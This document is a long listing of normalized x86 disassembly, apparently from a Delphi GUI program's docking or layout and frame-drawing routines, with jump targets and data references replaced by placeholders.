mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov ebx edx
mov esi eax
cmp [ ebx + 0x59 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
mov eax [ esi + 0x64 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ eax + 0x4 ] ebx
call sub_47cb48
jmp r-xdata
movzx eax [ ebp - 0x1 ]
test al al
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ esi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
lea edx [ ebp - 0x20 ]
mov eax [ esi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0xa0 ]
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov eax [ esi + 0x14 ]
cmp [ eax + 0x5e ] 0x0
je r-xdata
mov eax [ esi + 0x14 ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov [ ebp - 0x1 ] 0x4
sub al 0x5
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
call sub_40ac8c
push esi
lea esi [ ebp - 0x30 ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
lea ecx [ ebp - 0x20 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0x20 ]
mov eax ebx
call sub_470710
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_47c72c
mov edx [ esi + 0x64 ]
mov [ edx + 0x8 ] eax
mov [ eax + 0x14 ] edx
mov [ eax + 0x4 ] ebx
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax esi
call sub_47d018
mov [ ebp - 0x8 ] eax
movzx eax [ ebp - 0x1 ]
movzx eax [ eax + rw-data ]
mov [ ebp - 0x9 ] al
mov eax [ esi + 0x64 ]
call sub_47c768
dec eax
jne r-xdata
mov edx eax
mov eax esi
call sub_47e2e0
mov edx ebx
mov eax esi
call sub_47d018
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax ebx
call sub_470df0
mov edi eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_47c72c
mov [ eax + 0x4 ] ebx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x64 ]
movzx edx [ ebp - 0x9 ]
mov [ eax + 0x10 ] dl
movzx edx [ ebp - 0x9 ]
dec dl
je r-xdata
mov eax ebx
call sub_470ddc
mov [ ebp - 0x10 ] eax
mov edx [ esi + 0x64 ]
movzx edx [ edx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x14 ]
movzx edx [ edx + 0x10 ]
jmp r-xdata
mov edi eax
mov eax [ eax + 0x8 ]
mov edx 0x2
call sub_47c8ec
mov [ edi + 0x20 ] eax
mov eax [ esi + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x1
call sub_47c8ec
mov [ esi + 0x68 ] eax
jmp r-xdata
dec dl
je r-xdata
cmp dl [ ebp - 0x9 ]
jne r-xdata
mov [ ebp - 0x9 ] dl
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov edi eax
mov eax [ eax + 0x8 ]
mov edx 0x1
call sub_47c8ec
mov [ edi + 0x20 ] eax
mov eax [ esi + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x2
call sub_47c8ec
mov [ esi + 0x68 ] eax
jmp r-xdata
movzx edx [ ebp - 0x9 ]
push edx
movzx edx [ ebp - 0x1 ]
movzx edx [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax esi
call sub_47d334
movzx edx [ ebp - 0x1 ]
movzx edx [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax esi
call sub_47d4d8
jmp r-xdata
sub_47d334
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_47c72c
mov ebx eax
movzx eax [ ebp + 0xc ]
mov [ ebx + 0x10 ] al
test edi edi
jne r-xdata
mov [ ebp - 0x8 ] ebx
mov eax edi
call sub_47ccc4
mov edx [ ebp - 0x8 ]
mov [ edx + 0x20 ] eax
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
test eax eax
je r-xdata
mov eax ebx
mov edx [ esi + 0x68 ]
mov [ eax + 0x20 ] edx
mov eax [ esi + 0x64 ]
call sub_47ccc4
mov [ esi + 0x68 ] eax
movzx eax [ ebp + 0xc ]
mov [ esi + 0x48 ] al
xor eax eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] 0x3fe00000
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ edi + 0xc ]
mov [ ebx + 0xc ] eax
test eax eax
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x18 ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_47e660
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_47d080
mov eax [ esi + 0x64 ]
call sub_47ccc4
sar eax 0x1
jns r-xdata
mov eax [ esi + 0x64 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_47e660
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_47d080
jmp r-xdata
mov eax [ ebx + 0x14 ]
cmp edi [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0x18 ] ebx
mov [ esi + 0x4c ] eax
push esi
push sub_47eb24
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_47d080
mov edi [ ebp - 0x4 ]
mov eax [ esi + 0x64 ]
call sub_47ccc4
sar eax 0x1
jns r-xdata
adc eax 0x0
push esi
push sub_47ec54
xor edx edx
mov eax esi
call sub_47d080
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ edi + 0x14 ] ebx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ eax + 0x8 ] ebx
mov [ edi + 0x20 ] eax
adc eax 0x0
mov eax ebx
call sub_47c9a4
mov eax ebx
call sub_47cd3c
push esi
push sub_47ec54
xor edx edx
mov eax esi
call sub_47d080
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
mov [ ebx + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] edi
jmp r-xdata
sub_47d4d8
push ebp
mov ebp esp
push ebx
mov ebx ecx
mov ecx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
test cl cl
je r-xdata
mov eax [ eax + 0x64 ]
mov ebx [ eax + 0x8 ]
test cl cl
je r-xdata
mov [ edx + 0xc ] ebx
mov eax [ ebx + 0x18 ]
mov [ edx + 0x18 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
mov [ edx + 0x18 ] ebx
mov eax [ ebx + 0xc ]
mov [ edx + 0xc ] eax
test eax eax
je r-xdata
jmp r-xdata
mov [ ebx + 0x18 ] edx
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
cmp ebx [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0xc ] edx
mov [ ebx + 0xc ] edx
jmp r-xdata
mov [ eax + 0x18 ] edx
mov eax [ ebx + 0xc ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_47c9a4
mov eax [ ebx + 0x14 ]
call sub_47cd3c
pop ebx
pop ebp
retn 0x4
mov [ eax + 0x8 ] edx
mov ebx eax
sub_47d550
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov edx 0x1
mov eax esi
call sub_47c868
mov edi eax
mov edx 0x2
mov eax esi
call sub_47c868
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebx ]
cmp eax [ ebp - 0xc ]
jl r-xdata
cmp edi [ ebx + 0x4 ]
jg r-xdata
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x18 ]
add edx [ ebp - 0xc ]
cmp eax edx
jg r-xdata
mov eax [ ebx + 0x4 ]
mov edx [ ebp - 0x4 ]
add edi [ edx + 0x18 ]
cmp eax edi
jg r-xdata
cmp edi [ ebx + 0x4 ]
jg r-xdata
mov eax [ ebx ]
cmp eax [ ebp - 0xc ]
jl r-xdata
mov edx 0x1
mov eax esi
call sub_47c8ec
add edi eax
cmp edi [ ebx + 0x4 ]
jl r-xdata
mov edx 0x2
mov eax esi
call sub_47c8ec
add eax [ ebp - 0xc ]
cmp eax [ ebx ]
jl r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax [ ebx + 0x4 ]
mov edx [ esi + 0x4 ]
mov edx [ edx + 0x44 ]
add edx 0xf
cmp eax edx
jge r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax [ esi + 0x4 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
sub edx 0xf
cmp edx [ ebx ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x2
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x14
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x2
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x14
jmp r-xdata
sub_47d654
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov edi edx
mov ebp eax
mov eax [ ebp + 0x14 ]
call sub_475884
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x14 ]
mov edx esi
call sub_475848
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
je r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov eax [ edi ]
sub eax [ ebx + 0x40 ]
mov edx [ edi + 0x4 ]
sub edx [ ebx + 0x44 ]
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x54 ]
lea eax [ esp + 0x10 ]
mov edx esp
call sub_40abd8
test al al
jne r-xdata
cmp [ ebx + 0x1ea ] 0x0
je r-xdata
mov eax ebx
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
sub_47d6ec
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x2
jne r-xdata
mov eax ebx
call sub_47ccc4
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp eax [ edx + 0x4 ]
jl r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_47ccc4
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp eax [ edx ]
jl r-xdata
mov eax ebx
call sub_47ccc4
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0xc ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp eax [ edx + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0x40 ]
test al al
je r-xdata
mov eax ebx
call sub_47ccc4
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0xc ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp eax [ edx ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x14 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x14 ] 0x0
jne r-xdata
mov eax ebx
call sub_47cd9c
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x14 ] ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x14 ] ebx
jmp r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_47cdc4
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_47cd9c
call sub_47d6ec
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_47cdc4
call sub_47d6ec
pop ecx
sub_47d800
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x10 ]
xor edx edx
mov [ eax ] edx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_47d654
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x64 ]
call sub_47cdc4
test eax eax
je r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
cmp eax [ ebx + 0x90 ]
jne r-xdata
mov eax [ ebp - 0x14 ]
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
mov edx ebx
mov eax [ ebp - 0xc ]
call sub_47d018
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x64 ]
call sub_47cdc4
call sub_47d6ec
pop ecx
mov eax [ ebp - 0x10 ]
mov [ eax ] 0x1
jmp r-xdata
sub_47d888
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_47d92e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
xor edx edx
call sub_4070a8
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0xc ]
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47d935
lea eax [ ebp - 0xc ]
call j_sub_4068a0
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_408928
retn
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40891c
add esp 0x4
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov esi [ eax ]
call [ esi + 0xc ]
call sub_4199d0
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_419900
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_4070a8
sub_47d93c
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_47dc7f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0xc ]
call sub_47e244
mov eax [ ebp - 0xc ]
movzx eax [ eax + 0x74 ]
mov [ ebp - 0x25 ] al
mov eax [ ebp - 0xc ]
call sub_47cfa8
xor eax eax
push ebp
push sub_47dc5a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x1c ] 0x40000
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x70 ]
cmp eax [ ebp - 0x1c ]
jne r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x74 ] 0x0
mov [ ebp - 0x26 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x70 ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x3c ] 0x0
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0x0
lea eax [ ebp - 0x40 ]
push eax
push 0x1
lea edx [ ebp - 0x44 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160e8
call sub_4060b0
mov eax [ ebp - 0xc ]
lea edx [ eax + 0x74 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ ebp - 0x26 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x20 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0xc ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0xc ]
cmp [ eax + 0x74 ] 0x0
je r-xdata
inc eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x1c ] 0x0
xor eax eax
mov [ ebp - 0x18 ] eax
xor esi esi
movzx edx [ ebp - 0x26 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0xc ]
call sub_47f398
mov edx [ ebp - 0xc ]
mov [ edx + 0x68 ] eax
inc [ ebp - 0x1c ]
dec [ ebp - 0x30 ]
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x8 ]
mov si 0xffb7
call sub_40587c
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47dc61
mov eax [ ebp - 0xc ]
movzx edx [ ebp - 0x25 ]
mov [ eax + 0x74 ] dl
mov eax [ ebp - 0xc ]
cmp [ eax + 0x64 ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_47c72c
mov ebx eax
lea edx [ ebx + 0x10 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebx + 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
cmp [ eax + 0x74 ] 0x0
je r-xdata
push ebp
lea eax [ ebp - 0x8 ]
call sub_47d888
pop ecx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x10 ]
call sub_470d70
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x10 ]
call sub_471d54
mov eax [ ebp - 0xc ]
call sub_47cfac
retn
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_47c72c
mov edx [ ebp - 0xc ]
mov [ edx + 0x64 ] eax
push ebp
lea eax [ ebp - 0x8 ]
call sub_47d888
pop ecx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
movzx edx [ ebx + 0x10 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov ecx eax
mov edx [ ebx + 0x20 ]
mov eax [ ebp - 0xc ]
call sub_47f398
mov [ ebx + 0x20 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_47ca94
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x64 ] ebx
jmp r-xdata
mov eax ebx
call sub_4055f0
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
cmp [ esi + 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov esi ebx
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov [ esi + 0x8 ] ebx
mov [ ebx + 0x14 ] esi
jmp r-xdata
mov [ esi + 0xc ] ebx
mov [ ebx + 0x18 ] esi
mov eax [ esi + 0x14 ]
mov [ ebx + 0x14 ] eax
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov [ ebp - 0x24 ] esi
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x14 ]
test eax eax
jle r-xdata
mov [ ebp - 0x2c ] esi
mov esi [ esi + 0x18 ]
mov eax [ ebp - 0x2c ]
call sub_4055f0
mov eax [ ebp - 0x24 ]
mov [ eax + 0xc ] ebx
mov eax [ ebp - 0x24 ]
mov [ ebx + 0x18 ] eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x14 ]
mov [ ebx + 0x14 ] eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x1c ] 0x1
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x24 ] eax
inc [ ebp - 0x1c ]
dec [ ebp - 0x30 ]
jne r-xdata
sub_47dc90
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + 0x18 ]
mov eax edi
add eax esi
sub eax 0x2
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx edi
add ecx ebx
sub ecx 0x2
mov edx esi
mov eax ebx
call sub_40ab90
call sub_485c78
call sub_485d84
test al al
je r-xdata
push 0x0
push 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_44df24
push eax
call DrawFrameControl
call sub_485c78
lea ecx [ ebp - 0xc ]
mov dl 0x34
call sub_486dfc
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_44df24
push eax
call sub_485c78
lea ecx [ ebp - 0xc ]
pop edx
call sub_485fac
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47dd24
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x44 ]
mov edx 0xff000014
call sub_44c948
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov ecx ebx
mov edx esi
mov edi [ eax ]
call [ edi + 0x5c ]
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x58 ]
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x58 ]
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x44 ]
mov edx 0xff000010
call sub_44c948
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x58 ]
mov ecx ebx
dec ecx
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov edx esi
mov ebx [ eax ]
call [ ebx + 0x58 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_47ddb0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx [ ebp + 0xc ]
mov edx edi
mov eax esi
call sub_40ab90
call sub_485c78
lea ecx [ ebp - 0xc ]
mov edx ebx
call sub_4865f4
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x8 ]
call sub_44df24
push eax
call sub_485c78
lea ecx [ ebp - 0xc ]
pop edx
call sub_485f18
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_47de0c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
movzx eax [ eax + 0x5d ]
dec eax
sub al 0x2
jae r-xdata
push ebp
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x18 ]
inc eax
mov edx [ ebx + 0x4 ]
inc edx
call sub_47dc90
pop ecx
call sub_485c78
call sub_485d84
test al al
je r-xdata
push ebp
mov edx [ ebx + 0x4 ]
inc edx
mov eax [ ebx ]
inc eax
call sub_47dc90
pop ecx
call sub_485c78
call sub_485d84
test al al
je r-xdata
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x5
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x4 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x3
mov eax [ ebx ]
add eax 0x2
call sub_47dd24
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x8
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x4 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x6
mov eax [ ebx ]
add eax 0x2
call sub_47dd24
pop ecx
push ebp
mov edx [ ebx + 0x8 ]
mov ecx [ ebp - 0x4 ]
sub edx [ ecx + 0x18 ]
sub edx 0x2
push edx
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0xa
push edx
mov ecx eax
inc ecx
mov edx [ ebx ]
add edx 0x2
mov al 0x2
call sub_47ddb0
pop ecx
jmp r-xdata
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x4 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x5
add eax 0x3
call sub_47dd24
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x4 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x8
add eax 0x6
call sub_47dd24
pop ecx
jmp r-xdata
push ebp
mov eax [ ebx ]
mov edx eax
add edx 0xa
push edx
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov ecx [ ebx + 0x4 ]
mov edx [ ebp - 0x4 ]
add ecx [ edx + 0x18 ]
inc ecx
mov edx eax
inc edx
mov al 0x3
